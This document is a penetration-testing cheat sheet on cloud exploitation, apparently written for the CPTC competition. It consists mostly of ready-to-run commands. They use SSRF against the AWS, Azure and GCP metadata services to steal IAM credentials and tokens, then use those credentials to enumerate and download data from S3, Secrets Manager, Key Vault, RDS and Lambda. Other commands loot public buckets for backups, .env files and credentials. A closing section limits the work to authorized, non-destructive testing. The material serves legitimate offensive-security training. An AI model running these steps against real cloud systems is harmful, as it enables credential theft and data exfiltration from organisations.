# Cloud Exploitation - Quick Wins

---

## PRIORITY 1: SSRF TO METADATA SERVICE

### AWS Metadata Exploitation

#### Step 1: Confirm SSRF to Metadata

```bash
# Test via vulnerable parameter
curl "http://TARGET/proxy?url=http://169.254.169.254/latest/meta-data/"

# Common vulnerable endpoints:
# - /proxy?url=
# - /fetch?url=
# - /download?file=
# - /redirect?target=
# - /image?src=
```

#### Step 2: Extract IAM Credentials

```bash
# Get role name
curl "http://TARGET/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Example output: WebAppRole

# Get credentials for that role
curl "http://TARGET/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/WebAppRole"

# Output (save this):
{
  "Code": "Success",
  "LastUpdated": "2024-10-24T10:30:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjEMz....[very long token]",
  "Expiration": "2024-10-24T16:30:00Z"
}
```

#### Step 3: Use Stolen Credentials

```bash
# Configure AWS CLI
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEMz...."
export AWS_DEFAULT_REGION="us-east-1"

# or through CLI as shown in 01-RECONNAISSANCE/cloud/commands.md

# Verify access
aws sts get-caller-identity

# Example output:
{
    "UserId": "AROAI...",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/WebAppRole/i-1234567890abcdef0"
}

# Now enumerate what you can access
```

#### Step 4: Enumerate AWS Resources

```bash
# S3 buckets
aws s3 ls
aws s3 ls s3://BUCKET_NAME
aws s3 cp s3://BUCKET_NAME/sensitive-file.txt .

# EC2 instances
aws ec2 describe-instances

# RDS databases
aws rds describe-db-instances

# Lambda functions
aws lambda list-functions

# Secrets Manager
aws secretsmanager list-secrets

# IAM (if you have permissions)
aws iam list-users
aws iam list-roles
```
--- 

### Azure Metadata Exploitation

```bash
# Extract managed identity token
curl -H "Metadata:true" "http://TARGET/proxy?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Output contains access_token
# Use with Azure CLI:
export AZURE_ACCESS_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGc..."

# Enumerate Azure
az account show
az resource list
az vm list
az storage account list
```

### GCP Metadata Exploitation

```bash
# Extract service account token
curl -H "Metadata-Flavor: Google" "http://TARGET/proxy?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# Get service account email
curl -H "Metadata-Flavor: Google" "http://TARGET/proxy?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"

# Use with gcloud CLI
gcloud auth login --brief --access-token="ya29.c.EL..."
gcloud projects list
gcloud compute instances list
```

---

## PRIORITY 2: PUBLIC S3 BUCKET EXPLOITATION

### Read-Only Access Exploitation

```bash
# Test if bucket is publicly readable
aws s3 ls s3://BUCKET_NAME --no-sign-request

# If successful, enumerate all contents
aws s3 ls s3://BUCKET_NAME --recursive --no-sign-request --human-readable

# Download interesting files
aws s3 cp s3://BUCKET_NAME/database-backup.sql . --no-sign-request
aws s3 cp s3://BUCKET_NAME/credentials.txt . --no-sign-request
aws s3 cp s3://BUCKET_NAME/.env . --no-sign-request

# Sync entire bucket (if small enough)
aws s3 sync s3://BUCKET_NAME ./local_backup --no-sign-request
```

**What to look for in buckets:**
- Database backups (`.sql`, `.bak`, `.dump`)
- Configuration files (`.env`, `.config`, `config.json`)
- Credentials (`credentials.txt`, `.aws/`, `.ssh/`)
- Source code (`.git/`, `*.py`, `*.php`)
- Logs (`*.log` - may contain credentials)
- Backups of any kind

### Write Access Exploitation (rare but critical)

```bash
# Test if publicly writable
echo "test" > test.txt
aws s3 cp test.txt s3://BUCKET_NAME/test.txt --no-sign-request

# If successful:
# 1. Document as critical
# 2. Remove test file immediately
aws s3 rm s3://BUCKET_NAME/test.txt --no-sign-request

# DO NOT upload malicious content - document only!
```

---

## PRIORITY 3: STOLEN CREDENTIAL EXPLOITATION

### Using Found AWS Credentials

**Credentials found in code/config files:**

```bash
# Configure AWS CLI
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

# Test credentials
aws sts get-caller-identity

# If successful, enumerate systematically
```

### IAM Permission Enumeration

```bash
# What can you do?
aws iam get-user
aws iam list-attached-user-policies
aws iam list-user-policies

# Get policy details
aws iam get-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/PolicyName \
  --version-id v1

# Common high-value permissions to check:
# - s3:GetObject / s3:ListBucket
# - ec2:DescribeInstances
# - rds:DescribeDBInstances  
# - secretsmanager:GetSecretValue
# - lambda:InvokeFunction
# - iam:* (very dangerous if present)
```

### High-Value AWS Resources to Target

**1. Secrets Manager**
```bash
# List secrets
aws secretsmanager list-secrets

# Get secret value
aws secretsmanager get-secret-value --secret-id SECRET_NAME

# Often contains:
# - Database passwords
# - API keys
# - Admin credentials
```

**2. S3 Buckets (With Credentials)**
```bash
# List all buckets you can access
aws s3 ls

# Download interesting content
aws s3 sync s3://BUCKET_NAME ./backup
```

**3. RDS Databases**
```bash
# List databases
aws rds describe-db-instances

# Get connection info
aws rds describe-db-instances --db-instance-identifier DB_NAME

# Extract:
# - Endpoint (hostname)
# - Port
# - Master username
# Then try to connect from internet or pivot point
```

**4. EC2 Instances**
```bash
# List instances
aws ec2 describe-instances

# Get public IPs
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,PublicIpAddress,PrivateIpAddress]'

# Check for exposed services on those IPs
nmap PUBLIC_IP
```

**5. Lambda Functions**
```bash
# List functions
aws lambda list-functions

# Get function code
aws lambda get-function --function-name FUNCTION_NAME

# Download URL is provided - may contain secrets in code
```

---

## AZURE EXPLOITATION

### Using Stolen Azure Credentials

```bash
# Login with service principal
az login --service-principal \
  --username APP_ID \
  --password CLIENT_SECRET \
  --tenant TENANT_ID

# Or with access token
export AZURE_ACCESS_TOKEN="eyJ0eXAiOiJKV1QiLCJh..."
az account show

# List all accessible resources
az resource list
```

### High-Value Azure Resources

**1. Storage Accounts**
```bash
# List storage accounts
az storage account list

# List containers in storage account
az storage container list --account-name ACCOUNT_NAME

# Download blobs
az storage blob download \
  --account-name ACCOUNT_NAME \
  --container-name CONTAINER \
  --name backup.sql \
  --file ./backup.sql
```

**2. Key Vault**
```bash
# List key vaults
az keyvault list

# List secrets in vault
az keyvault secret list --vault-name VAULT_NAME

# Get secret value
az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME
```

**3. Virtual Machines**
```bash
# List VMs
az vm list

# Get VM details including public IPs
az vm list-ip-addresses
```

---

## GCP EXPLOITATION

### Using Stolen GCP Credentials

```bash
# Authenticate
gcloud auth activate-service-account --key-file=key.json

# List projects
gcloud projects list

# Set active project
gcloud config set project PROJECT_ID

# List resources
gcloud compute instances list
gcloud storage buckets list
gcloud sql instances list
```

---

## SAFETY & SCOPE CONSIDERATIONS

### What's SAFE in CPTC

**Reading cloud resources**
- Listing S3 buckets/contents
- Reading public buckets
- Downloading files from authorized resources
- Enumerating resources with stolen credentials

**SSRF exploitation**
- Accessing metadata service via web app vulnerability
- Extracting credentials via SSRF
- Using those credentials for reconnaissance

### What to AVOID
 **Modifying cloud resources**
- Creating/deleting S3 buckets
- Modifying IAM policies
- Creating new users/roles
- Uploading malicious content (unless explicitly scoped)

 **Service disruption**
- Stopping EC2 instances
- Deleting databases
- Modifying security groups
- Any destructive actions

### Documentation Requirements

**For SSRF finding:**
- Screenshot of successful metadata access
- Extracted credentials (REDACT in report!)
- AWS CLI output showing access
- Enumeration results

**For public bucket finding:**
- Screenshot of bucket listing
- Sample sensitive files found
- Proof of data access
- DO NOT include actual sensitive data in report

---

## EXPECTED FINDINGS

### If Cloud is Present in CPTC

**CRITICAL (Most Valuable):**
- SSRF to cloud metadata service
- Stolen cloud credentials enable resource access
- Public S3 bucket with database backups

**HIGH:**
- Public S3 bucket with sensitive files
- Over-permissioned IAM roles
- Exposed Azure Blob storage

**MEDIUM:**
- Cloud credentials in source code (if can't use them)
- Misconfigured bucket policies

---
